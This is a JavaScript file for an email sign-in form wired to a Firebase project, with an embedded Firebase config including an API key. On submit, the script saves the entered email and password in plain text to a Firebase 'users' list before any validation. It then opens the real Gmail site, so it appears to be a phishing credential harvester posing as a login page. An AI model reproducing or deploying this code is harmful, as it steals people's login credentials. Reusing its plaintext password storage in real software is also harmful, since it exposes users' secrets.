
const firebaseConfig = {
    apiKey: "AIzaSyBVzNptttQoRWs-hC-N9X-aQxfLRb_nnN8",
    authDomain: "email-login-9b258.firebaseapp.com",
    projectId: "email-login-9b258",
    storageBucket: "email-login-9b258.appspot.com",
    messagingSenderId: "482110916331",
    appId: "1:482110916331:web:7d931232d830981233a0ae",
    measurementId: "G-9QBZE13TW1"
  };

  firebase.initializeApp(firebaseConfig);

  const database = firebase.database()

  const ref = database.ref("users")

const form = document.getElementById('signIn')

form.addEventListener("submit", (e) =>{
    e.preventDefault()
    const pass = document.getElementById('password').value;
    const mail = document.getElementById('email').value;
    const errorMail = document.getElementById('error-mail');
    const errorPass = document.getElementById('error-pass')
    const successMsg = document.getElementById('success')

    ref.push({
        email: mail,
        password: pass
      });

    errorMail.textContent = '';
    errorPass.textContent = '';

    if (mail === '') {
        errorMail.textContent = 'Email is missing!';
        return;
    }

    if (pass === '') {
        errorPass.textContent = 'Password is missing!';
        return;
    }    

    if (mail !== '' && pass !== '') {
        successMsg.style.display = 'block';
        setTimeout(() => {
            successMsg.style.display = 'none';
        }, 2000);
    }
    window.open("https://mail.google.com/", "_blank");
    form.reset()
})

function togglePassword(){
const password$ = document.getElementById("password");
const displayPass$ = document.getElementById('displayPass');

if(password$.type === 'password'){
    password$.type = 'text';
    displayPass$.textContent = 'Hide'
} else {
    password$.type = 'password';
    displayPass$.textContent = 'Show'
}
}




